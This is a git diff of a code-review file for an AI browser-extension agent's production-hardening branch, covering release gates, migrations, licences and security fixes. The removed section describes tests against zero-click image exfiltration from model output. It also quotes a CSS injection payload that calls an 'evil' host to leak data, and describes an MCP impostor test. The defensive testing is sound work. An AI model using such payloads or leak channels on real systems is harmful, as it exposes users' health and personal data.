@@ -1,315 +1,435 @@
-# Review: `hardening/prod-ready`, Checkpoint 1 (Phase 1: S1–S7)
+# Review: `hardening/prod-ready`, Checkpoint 2 (Phase 2: R1–R9)
 
 | | |
 |---|---|
 | Branch | `hardening/prod-ready` (local only, never pushed) |
-| Base | `5fe5227`: `origin/main` (`c64838b`) plus the 8 Phase A commits from `apty-agent-review-A-c65edcf.bundle`. See "Conflicts" for why. |
-| Code head | `1868729`; the branch head is the next commit, which adds this file and STATUS |
-| Build zip | `apty-agent-prod-phase1-1868729.zip`: a clean build of the branch head, `manifest.json` at the top |
-| Git bundle | `apty-agent-prod-phase1-1868729.bundle`: `HEAD` and `refs/heads/hardening/prod-ready`, excluding `origin/main`. It carries the Phase A commits too, so it applies to `origin/main` as it is today. |
+| Base | `origin/main` `c64838b` (unchanged since Checkpoint 1) plus the 8 Phase A commits and Phase 1 |
+| Code head | `e492c55`; the branch head is the next commit, which adds this file and STATUS |
+| Build zip | `apty-agent-prod-phase2-e492c55.zip`, a clean build, `manifest.json` at the top; also the release-style pair `apty-agent-v0.1.0.zip` and `apty-agent-v0.1.0-webstore.zip` |
+| Git bundle | `apty-agent-prod-phase2-e492c55.bundle`: `HEAD` and `refs/heads/hardening/prod-ready`, excluding `origin/main` (Phase A, Phase 1 and Phase 2) |
 | Checksums | `SHA256SUMS.txt` |
-| Naming | The zip and bundle are named after the code head, `1868729`, because a commit cannot contain its own hash. The branch head adds only this file and `docs/STATUS.md`, so the zip's code is the same. |
 | Spec | [`docs/tasks/prod/`](docs/tasks/prod/00-rules.md) |
 
-This file replaces the Phase A review; that text is in git history:
-`git show 5fe5227:REVIEW.md`.
+This file replaces the Checkpoint 1 review: `git show c2ac898:REVIEW.md`
+has Phase 1 (S1–S7) in full. You approved Checkpoint 1 and then asked to
+"complete all the phases", so Phase 2 ran without a separate "continue";
+Phase 3 follows this checkpoint the same way.
 
-Nothing here was run against a real AI provider, a real tenant or the Chrome
-Web Store. Browser tests ran in Chrome for Testing 145 (puppeteer's build,
-because `/opt/pw-browsers/chromium` does not exist on this machine) against
-a mock model, fixture pages and the real MCP daemon.
+Nothing here was run against a real AI provider, a real tenant or the
+Chrome Web Store. Browser tests ran in Chrome for Testing 145 against a mock
+model, fixture pages and the real MCP daemon.
 
 ## Owner decisions (D1–D7)
 
-You did not answer D1–D7; you wrote "go ahead and do all the fixes". The
-prompt says a default applies only after "use defaults", so each default
-below is applied **provisionally**, in one place that is easy to change.
-Please confirm or change each one.
+Still unanswered, so every default below is applied **provisionally**.
+Please confirm or change each.
 
-| ID | Decision | What Phase 1 did |
+| ID | Decision | Applied |
 |---|---|---|
-| D1 | Distribution | Nothing yet (Phase 2, R6). |
-| D2 | Extension ID | Nothing yet (Phase 2, R7). The pinned ID is unchanged. |
-| D3 | Skills in the store build | **Default applied:** imported skills keep working, and the model can no longer write a script and then run it. Sandboxed skill code is refused any write or `mkdir` under `skills/<name>/scripts/`, in `packages/browser-runtime/src/vm/skill-api.ts` (`assertNotScriptPath`). skill-creator ("Save as Skill") stays, but it now makes instruction-only skills. |
-| D4 | Tab titles in Strict | **Default applied:** in Strict a tab or page description has no title and only the origin. `packages/browser-runtime/src/runtime/result-privacy.ts` (`strictPage`) and `context-privacy.ts`. |
-| D5 | Licence | Nothing yet (Phase 2, R4). |
-| D6 | Icon artwork | Nothing yet (Phase 2, R6). |
-| D7 | Providers for PHI | **Default applied:** Settings warns for every provider. The list is `PHI_APPROVED_PROVIDERS` in `packages/agent-core/src/config/ai-providers.ts`; it is empty, so every provider shows the warning until you add names. |
+| D1 | Distribution | Default: **unlisted Web Store**. The listing, smoke test and R9 list assume it. |
+| D2 | Extension ID | Default: **adopt the Web Store's ID**. The store zip has no `key`; the unpacked zip keeps the pinned ID for development, enterprise and tests. Client and Studio must allow-list both (R7). |
+| D3 | Skills in the store build | Default (Phase 1): imported skills stay; the model can't write scripts. The remote-code answer is written for this. |
+| D4 | Tab titles in Strict | Default (Phase 1): withheld in Strict. |
+| D5 | Licence | Default: **MIT**; `LICENSE` adds "Copyright (c) 2026 Apty". Check the legal entity name. |
+| D6 | Icon artwork | Default: you supply it; **R6 is partial** until then. |
+| D7 | Providers for PHI | Default (Phase 1): Settings warns for every provider. |
 
-## Commits
+## Commits (Phase 2)
 
 | Commit | Subject |
 |---|---|
-| `fc3ddb8` | docs(prod): save the production-readiness prompt and work packages |
-| `e325a79` | fix(security): block zero-click image exfiltration from model output (S1) |
-| `c13cc1b` | fix(privacy): send store:false on every OpenAI request (S2) |
-| `0743ff9` | fix(types): name createAIProvider's return type (S2 follow-up) |
-| `d37ed0c` | fix(privacy): delete the agent's session history with its conversation (S3) |
-| `f5dc574` | fix(privacy): apply the URL and page-title policy to every tool result, context and MCP reply (S4) |
-| `150beee` | fix(security): tighten the approval gate (S5) |
-| `8d90442` | fix(security): mutually authenticate the MCP bridge (S6) |
-| `d7fd177` | style: format the S5 changes |
-| `a840c9f` | fix(agent): retry a rate limit or 5xx that happens before any output (S7) |
-| `b8cf1b6` | fix(redaction): redact an unterminated sensitive value in truncated JSON (S7) |
-| `06e8836` | fix(privacy): keep the page-world bridge off when settings can't be read (S7) |
-| `3f1034b` | fix(runtime): stop the side panel and the worker overwriting each other's session state (S7) |
-| `f64537f` | fix(worker): catch unhandled rejections and the listed promises (S7) |
-| `c13054f` | fix(ui): explain network and offline failures; check who asks for chat images (S7) |
-| `958bb4c` | feat(settings): warn that a provider must cover health data (S2/D7 default) |
-| `ac5cab5` | fix(lint): write the tool groups as plain arrays; no assignment in test expressions |
-| `1868729` | test(e2e): answer the application-deep approval; read capture events from the broadcast (S3/S5 setup) |
-| (next) | docs: Checkpoint 1 review and status |
+| `a0fd0d7` | chore(deps): remove unused dependencies and dead code; one @openai/agents-core (R1) |
+| `57308f4` | build(release): release only from main; run every CI audit; one 0.1.0 changelog (R5) |
+| `487af35` | build: ship LICENSE, third-party notices and the Inter OFL (R4) |
+| `450a0b4` | feat(settings): version the stored settings and migrate them (R3) |
+| `f486316` | feat(branding): move AIPex storage names to Apty ones, with a migration; Apty names on pages (R2) |
+| `9b25b8c` | feat(release): two extension IDs per D2; copy the running ID (R7) |
+| `288c2a4` | docs(store): single purpose, description, remote code, data use, screenshots (R6, partial) |
+| `a05429f` | docs(release): prepare the Infor LN re-run and say where results go (R9) |
+| `1dbe264` | test(i18n): ratchet on hard-coded UI text; en/zh key parity; keys typed from en.json (R8) |
+| `dac9c14` | feat(i18n): move the DOM Health, skills, route probe, preflight, data-handling, recent-requests and provider-error text into en/zh (R8) |
+| `5cf6110` | fix(options): label the ID Copy button so it doesn't also match "Extension ID" (R7) |
+| `e492c55` | test(e2e): let a closed tab's favicon request land before clearing; format the Copy button |
+| (next) | docs: Checkpoint 2 review and status |
 
-## Gates (Checkpoint 1)
+## Gates (Checkpoint 2)
 
-`rm -rf apps/browser-extension/dist`, then
-`tooling/scripts/verify-quiet.sh typecheck lint test audit build`:
+`rm -rf apps/browser-extension/dist`, then `tooling/scripts/release-dry-run.sh`
+(format, lint, typecheck, unit tests, `test:coverage` with the default
+timeouts, build, the full e2e suite, every audit, packaging, checksums):
 
 ```
-✓ typecheck (8s)
-✓ lint (1s)
-✓ test (44s)
-✓ audit (1s)
+✓ version check (0s)
+✓ format lint typecheck test coverage (117s)
 ✓ build (13s)
+✓ real-browser tests (439s)
+✓ audits (7s)
+✓ production dependency audit (4s)
+✓ pinned extension ID (0s)
+✓ package (2s)
+✓ checksums (0s)
+✓ verify checksums (0s)
 ```
 
-Unit tests, before (base `5fe5227`) and after:
+End-to-end, inside that run:
 
-| Suite | Before | After |
+```
+# tests 122
+# pass 122
+# fail 0
+# cancelled 0
+```
+
+All 13 tests that failed in Checkpoint 1 on the base build too now pass:
+the harness computed unpacked extension IDs from macOS's `/var/…` temp path
+while Chrome uses the real `/private/var/…` path (fixed in R2,
+`tempDir` returns the real path), and the A1 test counted a late
+`/favicon.ico` from the previous test's tab (setup fixed, 3/3 runs green).
+
+Unit tests, after Phase 1 → after Phase 2:
+
+| Suite | Phase 1 | Phase 2 |
 |---|---|---|
-| apty-debug-contract | 72 | 80 |
-| agent-core | 265 | 271 |
+| apty-debug-contract | 80 | 80 |
+| agent-core | 271 | 282 |
 | dom-snapshot | 395 | 395 |
-| browser-runtime | 964 | 1069 |
-| ui | 224 | 264 |
-| browser-extension | 303 | 313 |
-| mcp-bridge | 44 | 60 |
-| tooling scripts (`node --test`) | 17 | 23 |
+| browser-runtime | 1069 | 1086 |
+| ui | 264 | 268 |
+| browser-extension | 313 | 317 |
+| mcp-bridge | 60 | 60 |
+| tooling scripts (`node --test`) | 23 | 42 |
 
-Three existing tests were deleted, because they covered only the dead
-recording feature removed in S3. See S3.
-
-Other gates:
-
-```
-npm run format:check            Checked 793 files. No fixes applied.
-npm run audit:test-skips        ✓ every skipped test says why
-npm run audit:any               ✓ 604 explicit any, none above the baseline (was 605)
-npm run audit:docs-links        ✓ every relative link in the Markdown files resolves
-npm run audit:architecture      ✓ No architecture-boundary violations found.
-npm run audit:branding          ✓ No unreviewed AIPex branding found.
-npm run validate:extension      ✓ manifest.json is valid and every referenced entrypoint file exists.
-node tooling/scripts/check-extension-id.mjs   ✓ The manifest key yields the pinned Agent ID bpiondflhhdplemamgggcdajclmoeple
-```
-
-`npm run test:coverage` was run as `pnpm -r test:coverage --testTimeout=30000`
-plus mcp-bridge's `test:coverage -- --testTimeout=30000`, per rule 10.
-Every package passed its threshold:
+Coverage (default timeouts this time; every threshold passed):
 
 | Package | Statements | Branches | Functions | Lines |
 |---|---|---|---|---|
 | apty-debug-contract | 85.45% | 78.84% | 93.18% | 88.02% |
-| agent-core | 78.10% | 72.07% | 84.76% | 79.90% |
+| agent-core | 78.70% | 72.52% | 85.25% | 80.50% |
 | dom-snapshot | 91.41% | 83.45% | 97.82% | 93.17% |
-| browser-runtime | 54.14% | 50.79% | 58.37% | 54.07% |
-| ui | 45.98% | 37.04% | 44.33% | 46.78% |
-| browser-extension | 45.79% | 46.51% | 43.99% | 45.71% |
+| browser-runtime | 57.21% | 54.33% | 62.25% | 57.21% |
+| ui | 50.09% | 39.32% | 48.85% | 51.22% |
+| browser-extension | 46.09% | 46.70% | 44.16% | 46.01% |
 | mcp-bridge | 31.47% | 26.17% | 34.43% | 31.64% |
 
-End-to-end suite (`npm run test:e2e`, after a clean build):
+Other gates:
 
 ```
-# tests 118
-# pass 105
-# fail 13
-# cancelled 0
+npm run format:check       Checked 790 files. No fixes applied.
+npm run audit:any          ✓ 604 explicit any, none above the baseline
+npm run audit:i18n         ✓ 277 hard-coded UI strings, none above the baseline
+npm run audit:notices      ✓ THIRD_PARTY_NOTICES.txt matches the production dependencies
+npm run audit:branding     ✓ No unreviewed AIPex branding found.
+npm run audit:docs-links   ✓ every relative link in the Markdown files resolves
+pnpm audit --prod          No known vulnerabilities found   (mcp-bridge: the same)
+check-extension-id.mjs --store <store-dist>/manifest.json   ✓ has no "key"
 ```
 
-Every one of the 13 failures also fails, with the same error, when the same
-file runs against the base build (`E2E_EXTENSION_DIR=<base dist>`):
+Secret scan: TruffleHog 3.99.2 (Homebrew),
+`trufflehog git file://<repo> --since-commit c2ac898 --branch hardening/prod-ready --no-verification`,
+no exclude list: 602 chunks, **0 verified, 0 unverified**. Repeated on the
+branch head before packaging.
 
-| File | Failing tests | On the base build |
-|---|---|---|
-| `apty-client.e2e` | 5 (bridge, segments body ×2, 403 body, deny list) | same 5: "Chrome found nothing listening in the Apty Client" |
-| `studio.e2e` | 2 (no bridge, working) | same 2 |
-| `preflight.e2e` | 2 (all green, no bridge module) | same 2 |
-| `a11y.e2e` | 2 (side panel chat, light and dark) | same 2: "View full response" button not found |
-| `agent.e2e` | 2 (DOM Health after restart; create_new_tab A1) | same 2, see "Observed" |
+## Work packages (Phase 2)
 
-An earlier full run (73 pass, 16 fail, 3 cancelled) overlapped a stray test
-process of mine and is not counted. It did surface the two setup conflicts
-in `frames.e2e` and `dom-health-apps.e2e` listed under "Conflicts".
+Each behaviour change has a test that failed on the code before it and
+passes after; the outputs are in the commit messages' tests and listed here.
 
-Secret scan: TruffleHog 3.99.2 (Homebrew; the Docker daemon was not running),
-`trufflehog git file://<repo> --since-commit 5fe5227 --branch hardening/prod-ready --no-verification`,
-no exclude list: 344 chunks, **0 verified, 0 unverified**. The same scan is
-repeated on the branch head that adds this file, before packaging.
+### R1. Dependencies and dead code: done
 
-## Work packages
+- **Removed** from `apps/browser-extension`: `assistant-ui`, `bip39`,
+  `ahooks`, `markdown-to-jsx`, `remark-gfm`, `@modelcontextprotocol/sdk`,
+  `tokenlens`, and 20 packages only `@apty/ui` imports (it declares them
+  itself). From `@apty/ui`: `markdown-to-jsx`, `remark-gfm`, `tokenlens`.
+  Each had no import (a script that checks every `from`/`import()`/
+  `@import` in the package); build, unit tests and the model-path e2e files
+  passed without them, and the full e2e suite later passed 120/120.
+- **`pnpm audit --prod`:** before, with the ignore entry removed: 1 high
+  (`braces`, path `apps__browser-extension>assistant-ui>jscodeshift>micromatch>braces`).
+  After: "No known vulnerabilities found". The `ignoreCves` entry is gone;
+  `docs/archive/DECISIONS.md` records why the old reason was wrong.
+- **`@openai/agents-extensions` `^0.5.4` → `^0.7.2`:** `pnpm why` went from
+  two `@openai/agents-core` (0.5.4, 0.7.2) to one (0.7.2). `aisdk` moved to
+  the `ai-sdk` subpath (three imports changed).
+- **Dead code:** 20 files, 4,491 lines: `tools/{bookmark,history,organize-tabs}.ts`,
+  `tools/tools/{clipboard,context-menus,extensions,sessions,tab-groups,window-management}`,
+  `tools/tools/utils/wait-helper.ts`, `ui/src/i18n/i18n.ts`, and nine unused
+  ai-elements (`artifact`, `branch`, `chain-of-thought`, `context`, `image`,
+  `inline-citation`, `open-in-chat`, `task`, `web-preview`). No test covered
+  them. `hooks/use-storage.ts` is **not** dead (two importers); see Conflicts.
+- **Stale `packages/dom-snapshot/src/*.d.ts`** (6) deleted;
+  `packages/dom-snapshot/.gitignore` now ignores `src/**/*.d.ts`
+  (`git check-ignore` confirmed).
+- **`knip.json`** lists the real entry points (manifest entries, Vite
+  inputs, tooling scripts and e2e, the mcp-bridge bins). knip now reports 15
+  unused files, 71 unused exports and a few dependency findings; they are
+  listed as follow-up, not removed, because R1 scopes removal to the Facts.
+- **Follow-up:** `@openai/agents` 0.7 → 0.20 (not done here, as asked).
+- **Dependabot PRs** (open, checked through the GitHub API; none merged):
 
-Every "red" below means the new test was run against the code before the
-change and failed. Browser tests were run red against a build of the base
-(`5fe5227`) through `E2E_EXTENSION_DIR`.
+  | PR | Bump | Verdict |
+  |---|---|---|
+  | #15 | `pnpm/action-setup` 5.0.0 → 6.1.0 | Safe: CI green; touches `ci.yml` and `release.yml` |
+  | #7 | `@types/node` 25 → 26 (dev) | Safe once rebased onto this branch: CI green, types only |
+  | #3 | `@types/chrome` 0.1 → 0.3 (dev) | Safe once rebased: CI green, types only; it edits the extension's `package.json`, which R1 changed |
+  | #5 | `@radix-ui/react-dropdown-menu` 2.1.16 → 2.1.25 | Safe after rebase: patch, CI green; R1 removed the extension's copy, so only `@apty/ui`'s remains |
+  | #17, #18 | `actions/upload-artifact` 4 → 7, `actions/download-artifact` 4 → 8 | Not yet: CI is green but CI never runs `release.yml`; merge both together and run a release dry run (`workflow_dispatch`) first |
+  | #16 | `actions/setup-node` 6.5 → 7.1 | Not safe: its CI run failed |
+  | #4, #8 | `assistant-ui`, `ahooks` | Close: R1 removed both packages |
 
-### S1. Zero-click image exfiltration: done
+### R2. Branding and storage keys: done
 
-- **CSP:** the extension-page CSP adds `img-src 'self' data: blob:; media-src 'self' data: blob:; frame-src 'none'`. Nothing legitimate needs remote media: sound effects use `AudioContext`, and fonts are local. `validate-manifest.mjs` fails without these directives, through the tested `tooling/scripts/csp-policy.mjs`.
-- **Markdown sanitiser:** `Response` (chat, reasoning and tool output) appends a rehype step, `packages/ui/src/lib/safe-media.ts`, after Streamdown's own plugins:
-  - It drops `link`, `iframe`, `object`, `embed`, `video`, `audio`, `source`, `style`, `script`, `base`, `meta` and SVG `image`/`use`.
-  - It strips `srcset`, `poster` and `background`, plus any inline style containing `url(`, `image-set` or `@import`.
-  - A remote `<img>` becomes `[alt text]`.
-- **Image elements:** chat file parts, tool screenshots and prompt attachments render only `data:` or `blob:` images. Skill markdown and the evidence viewers already render text in `<pre>`. `image.tsx` and `web-preview.tsx` have no importers (R1).
-- **Red, then green:**
-  - Unit: on the base, 5 failed (markdown image, raw `<img>`, `<picture>`/`<source>` and others). Now 34 pass, plus file-part and screenshot tests.
-  - e2e `exfiltration.e2e.test.mjs`: on the base, the attacker server received `/leak.png?d=PATIENT-NAME-MRN-123&f=md` and `&f=html`, and the CSP-only check failed too. On the new build, 2/2 pass.
+- **Keys:** `STORAGE_KEYS` use `apty_*`; the input-mode and ZenFS keys moved
+  too. `storage/legacy-storage.ts` copies each old key, reads it back, and
+  only then removes the old one; a value already under the new name wins.
+  It runs at service-worker start (before the redaction mode and page-hook
+  settings are read), on update (before the R3 settings upgrade), and when
+  `ChromeStorageAdapter.load` finds a new key empty.
+- **Database:** `aipex-sessions` → `apty-sessions`, copied and verified
+  before the old database is dropped. Deleting a conversation or "Delete
+  everything" still reaches sessions not yet moved (S3 holds).
+- **On customer pages:** `data-apty-nodeid`/`-uid`/`-highlighted`, and
+  `apty-agent-*` ids and classes. Plain `apty-*` would have collided with
+  Apty Widget detection (`[id^="apty-"]`), so the Agent uses `apty-agent-`
+  and Widget detection now skips it. Logs say `[Apty Agent]`; skill-creator
+  text says Apty Agent.
+- **`check-branding.mjs`** scans `.js`/`.mjs` and matches whole tokens
+  case-sensitively. Before, its `"AIPex"` entry was compared
+  case-insensitively and so allowed every line: the check could not fail.
+- **Tests (red → green):** `legacy-storage.test.ts` (7; interrupted copy,
+  failed copy, torn copy, idempotence), `storage-adapter.test.ts` (lazy read),
+  `agent-session-migration.test.ts` (6), `lifecycle.test.ts` (update moves
+  settings and grants, then versions them), `widget-diagnostics.test.ts`,
+  `check-branding.test.mjs` (4), and `tooling/e2e/legacy-storage.e2e.test.mjs`:
+  seeds settings, grants and sessions under the old names, restarts the
+  Agent, and finds them under the new names with the conversation intact and
+  the chat working; and a page the agent worked on carries `data-apty-nodeid`
+  and no "aipex". On the old build the second test fails showing
+  `data-aipex-nodeid`, `#aipex-content-root` and `#aipex-border-overlay`.
+- **Not renamed** (listed in `check-branding.mjs`): the conversation,
+  screenshot and skills IndexedDB names, which hold user data and were not in
+  scope; internal message strings; the screenshot placeholder host; the
+  `AIPex` class; two mcp-bridge env vars.
 
-### S2. OpenAI `store: false`: done (Settings warning applied as the D7 default)
+### R3. Settings schema version: done
 
-- **Change:** a `wrapLanguageModel` middleware sets `providerOptions.openai.store = false` on every OpenAI request. Other providers are unchanged. `createAIProvider` gained an optional `fetch` so the test drives the real code path.
-- **Red, then green:** the unit test records the request body. On the old code it failed with `expected undefined to be false`.
-- **Fact difference:** `@ai-sdk/openai` 3.0.47 sends `store: openaiOptions.store`, which omits the field when it is unset, not `?? true`. OpenAI's Responses API then stores the request by default, so the Facts' conclusion holds. One targeted grep in the package's dist confirmed this.
-- **Docs:** PRIVACY.md links each provider's own data policy; each link was checked with a request (HTTP 200).
+`settingsVersion`, `SETTINGS_MIGRATIONS` and `migrateSettings` (idempotent,
+never downgrades) in agent-core; `withSettingsDefaults` fills missing
+fields. `onInstalled` (update) writes migrated settings back; the Settings
+page and the side panel's settings hook migrate on load; the Settings page
+applies defaults, also when a General-tab switch saves. Tests: a field added,
+renamed and removed across versions, plus idempotence, no downgrade and
+garbage input (11, red → green); the Settings page saves defaults and the
+version (red → green); the update handler (red → green).
 
-### S3. Deleting what the agent stored: done
+### R4. Licences: done (D5 default: MIT)
 
-- **Purge:** `purgeStoredData` clears every agent session in `aipex-sessions` and removes `aipex_last_capture_event`.
-- **Per-conversation delete:** deleting a conversation, the 7-day and 5-conversation retention, and opening an expired conversation each delete that conversation's agent session and any session forked from it.
-- **Click recording:** it was dead (nothing sends `start-recording`), so `recording.ts` and its side-panel port are removed. The click echo still works, but no longer stores the element and refuses senders from other extensions.
-- **Red, then green:**
-  - Unit: 3 + 4 tests failed on the base and pass now.
-  - e2e `stored-data.e2e.test.mjs`: on the base, "Timed out waiting for aipex-sessions to be empty" and "…alpha's session to be deleted". On the new build, 2/2 pass.
-- **Deleted tests (dead code only):** three `message-router.test.ts` tests for `start-recording`/`stop-recording`.
+`LICENSE` adds "Copyright (c) 2026 Apty" under AIPex's line;
+`THIRD_PARTY_NOTICES.txt` is generated from `pnpm licenses list --prod`
+(346 packages; 20 ship no licence file and say so) by
+`tooling/scripts/third-party-notices.mjs`, and `npm run audit:notices`
+fails when it is stale. A Vite plugin emits `LICENSE` and the notices into
+the build; the Inter OFL ships as `assets/Inter-OFL.txt`.
+`check-dist-licences.mjs` ends every `npm run build` and fails when any of
+the three is missing (before: "missing: LICENSE, THIRD_PARTY_NOTICES.txt,
+…"). The root and extension `package.json` say MIT.
+**For you:** four production packages are LGPL-3.0-or-later (`@zenfs/core`,
+`@zenfs/dom`, `memium`, `utilium`, used by the skill file system). Bundling
+LGPL code into a closed or store build has obligations; please have this
+checked.
 
-### S4. Remaining privacy gaps: done
+### R5. Release hygiene: done
 
-- **One filter for every tool result:** one wrapper over every registered tool's `invoke` (`tools/index.ts`) applies the policy to results for chat and MCP alike, through `result-privacy.ts`:
-  - `applyUrlPolicy` is applied to every http(s) URL, whether in a field or inside text.
-  - In Strict, a tab or page description loses its title and keeps only the origin (D4).
-- **MCP replies:** they also get Phase A's tool-result redaction (`redactToolOutput`) in the current mode.
-- **Attached contexts:** page and tab contexts get the same rules through a new agent option, `contextFormatter`. The chip the user sees stays readable.
-- **PRIVACY.md:** the masking section is rewritten to match the code:
-  - The "Masks" table now lists the actual key lists. A bare `name` key is not masked.
-  - Page prose is sent in every mode.
-  - URL paths are kept.
-  - Checkbox and radio states are sent.
-  - It says what MCP clients get.
-  - The false row "websites a skill script requests" is removed. The sandbox only receives `console`, `fs` and `downloadFile`.
-  - The Settings mode descriptions (en/zh) are corrected to match.
-- **Red, then green:** unit tests per tool and mode. e2e `phi-fixture.e2e.test.mjs` uses a page at `?mrn=884213&dob=1961-04-02` titled "Jane Testpatient - Chart":
-  - On the base, the model path and the MCP path both leaked all four needles.
-  - On the new build, 2/2 pass. The MCP path uses the real daemon.
+`release.yml` fetches full history and fails a tag whose commit is not on
+`origin/main` (`check-tag-on-main.mjs`, 3 tests, red → green). The gate adds
+`audit:any`, `audit:docs-links`, `audit:i18n`, `audit:notices` and
+`pnpm audit --prod` (also for the mcp-bridge), as CI runs them; the local
+dry run does the same. `CHANGELOG.md` has one `0.1.0 — 2026-10-16` section
+and an empty "Unreleased".
 
-### S5. Approval gate: done
+`tooling/scripts/release-dry-run.sh` (the release job, locally; full output
+under "Gates"):
 
-- **`run_console_command`:** never rememberable.
-- **`computer`:** grants are stored per action class (`computer:type`, `:key`, `:click`, `:drag`), and the prompt starts with the class ("Typing:", "Click:" and so on). Grants stored under the old `computer` name no longer match, so users are asked again (fails safe).
-- **CSS values:** `highlight_text_inline` and `highlight_element` accept only safe values (`tools/css-values.ts`). The injection string `red} body{background:url(https://evil/?d=x)} .a{` is rejected for all three parameters. A grep found no other tool that puts parameters into CSS or HTML.
-- **Navigation:**
-  - `create_new_tab` compares with the conversation's bound tab; with no bound tab it asks.
-  - The long-URL rule counts path, query and fragment.
-  - `switch_to_tab` to another origin asks.
-  - `close_tab` asks, and can't be remembered, for a tab this conversation did not open.
-- **DOM Health:** an `application-deep` run asks once per run, naming the mode and the page limit, and can't be remembered. The tool is shared by chat and MCP.
-- **`fill_form`:** the prompt lists `- label: "value"`, with each value cut at 60 characters.
-- **Skill runs:**
-  - The prompt shows the first 12 lines and the arguments.
-  - Skill downloads always show the save dialog.
-  - D3 as above.
-  - Built-in skill-creator files are now rewritten on every start, so updated text reaches existing installs. That change has no unit test: `skill-manager.ts` has none, and its `?raw` imports make one costly.
-- **Red, then green:**
-  - Unit: every rule failed on the base and passes now.
-  - e2e (`agent.e2e.test.mjs`, "approval hardening (S5)"), all three red on the base and green now:
-    - remembering a typing approval doesn't pre-approve a Delete click;
-    - `run_console_command` asks every time and never offers "Allow on this site";
-    - a deep DOM Health run asks once.
+```
+Release dry run for v0.1.0 (nothing is published)
+✓ version check (0s)
+- tag on main: checked by release.yml for a tag push only
+✓ format lint typecheck test coverage (117s)
+✓ build (13s)
+✓ real-browser tests (439s)
+✓ audits (7s)
+✓ production dependency audit (4s)
+✓ pinned extension ID (0s)
+✓ package (2s)
+✓ checksums (0s)
+✓ verify checksums (0s)
+Packages: /tmp/release-dry-run/release/
+```
 
-### S6. Mutually authenticated MCP bridge: done
+### R6. Store package: partial (icons wait for D6)
 
-- **Handshake:** the extension offers `apty-mcp.v1` and `apty-auth.hmac-v1`, never the token. It sends a nonce, and the daemon must answer with its own nonce and `HMAC-SHA256(token, "apty-mcp-auth/v1|daemon|nE|nD")`. Only then does the extension send its proof. The daemon registers the socket after checking that proof.
-- **Signed calls:** every `tools/call` carries `seq` and an HMAC under a session key derived from both nonces. The extension refuses unsigned, mis-signed and replayed calls.
-- **Allow-lists:** the daemon forwards only tools it publishes, and the extension refuses names outside the same list. `tooling/scripts/mcp-tool-names.test.mjs` keeps the two lists equal. As a result, `run_console_command`, which is not published, can no longer be called over MCP.
-- **Grants:** scoped to `chat` or `mcp`. Settings shows which requester holds each grant and revokes per requester. Grants stored without a requester are ignored.
-- **CLIs:** `browser-cli` and `apty-cli` never run `/entrypoint.sh`, and accept `BROWSER_CLI_WS_URL`/`AIPEX_WS_URL` only for `ws://127.0.0.1` or `ws://localhost`.
-- **Test vectors:** both sides assert the same vectors, and the daemon proof was cross-checked with `openssl dgst -sha256 -hmac`.
-- **Red, then green:**
-  - Daemon: 6 failed, then green.
-  - CLI: 5 failed (the remote URL was retried forever; `/entrypoint.sh` was spawned).
-  - Extension: 16 failed.
-  - e2e `mcp-impostor.e2e.test.mjs`: on the base, the extension connected (`{"success":true}`) and sent the token in the subprotocol. On the new build the impostor gets no token and no `auth/prove`, and its `tools/call` never runs. `mcp.e2e`, `phi-fixture` and the impostor test pass together against the real daemon.
+- Single purpose = the manifest `description`, word for word.
+- Store description copy written.
+- Remote code: recommended answer **Yes**, with the exact text for the D3
+  build (imported skill scripts in the bundled sandbox; page JavaScript only
+  after a per-run approval). Answering "No" would be inaccurate. Your call.
+- Data use: health information, PII, authentication information,
+  personal communications, web history, user activity and website content,
+  each with what the code sends.
+- `<all_urls>`: one position in both the listing and STATUS: kept for 0.1.0,
+  because customers run their applications on their own domains.
+- Five 1280×800 screenshots of the real extension on a synthetic demo app
+  (`docs/store/screenshots/`, `screenshot-harness.mjs --store`), checked by eye.
+- `tooling/scripts/rasterize-icons.mjs` renders 16/48/128 px icons, the
+  store's 128 px icon and the 440×280 tile from your artwork, with the
+  existing Chromium (its e2e test passes on a sample SVG). **Missing:** the
+  artwork (D6), so the icons are still AIPex's.
+- The store zip is built exactly as `release.yml` builds it (see Gates); its
+  manifest has no `key` and passes `validate:extension`.
 
-### S7. Robustness: done
+### R7. Extension ID: done (D2 default: the Web Store's ID)
 
-- **LLM retry:** the stream loop now runs inside the attempt loop. An attempt is retried only while nothing has reached the caller, and the session is rolled back so the user message isn't duplicated. The retry log carries only the code and the HTTP status.
-  - Red unit test with the real `run()` and a fake model throwing 429: `expected 1 to be 2` calls, and nothing logged.
-  - e2e `llm-retry.e2e.test.mjs`: one 429, then a reply. On the base: "No new reply". New build: pass.
-- **Truncated JSON:** `{"password":"hunter2`, `{"data":{"access_token":"abc` and `{"client_secret": "s3cr` are now redacted, both by the JSON key pass and by the text pass, which had the same bug. 7 tests failed on the base. Recorded in DECISIONS.md.
-- **Page hooks:** unreadable settings now mean the bridge is off (and unregistered if it was registered), and a URL that can't be parsed is not allowed. 4 failed on the base.
-- **Session state:** one `chrome.storage.session` key per context (`:page` or `:worker`). A failed write or read is logged as a code plus the key, and `flush()` reports the outcome. 2 failed on the base.
-- **Service worker:** `unhandledrejection` and `error` handlers log only the kind of error. The side-panel open on an icon click and the options open on install are caught. Red on the base.
-- **Offline and network errors:** "Could not reach the AI provider…" or "You appear to be offline…", in en and zh. 6 failed on the base.
-- **Sender checks:** `chat-images-listener` answers only this extension's own pages and service worker, and the capture-click echo checks the sender (S3). Red on the base.
+The unpacked/enterprise zip keeps the pinned `key`
+(`bpiondflhhdplemamgggcdajclmoeple`, still the e2e harness's
+`AGENT_EXTENSION_ID`); the Web Store zip has none and gets the store's ID at
+first upload. `check-extension-id.mjs --store` fails a store manifest that
+still has a key (test, red → green); `release.yml` and the dry run use it.
+`docs/integrations/apty/README.md#extension-ids` states both IDs and that
+the Client and Studio must allow-list both; STUDIO.md, SMOKE_TEST.md and
+RELEASING.md point to it. Settings → Apty Client now has a Copy button for
+the running ID (red → green); Studio already had one.
+
+### R8. i18n: done
+
+- **Moved:** every hard-coded string in `dom-health-card.tsx`,
+  `SkillDetails.tsx`, `route-probe-panel.tsx`, `preflight-panel.tsx`, the
+  Data-handling card, the recent-requests list and the provider errors
+  (model list, Test Connection, tool calling). 280 keys in `en.json` and
+  `zh.json`; English values are unchanged, so existing tests that read
+  English still pass. The screenshot-policy control already used `t()`.
+  Model-list and connection-test helpers take a translate function, English
+  by default; `ai-provider.ts` stays free of i18n.
+- **Ratchet** `tooling/scripts/check-i18n-baseline.mjs` (TypeScript parser;
+  JSX text, string children, user-visible attribute strings per file),
+  wired into CI, the release gate, the dry run and verify: **418 strings in
+  56 files → 277 in 52**. `dom-health-card.tsx` 85 → 0, `SkillDetails.tsx`
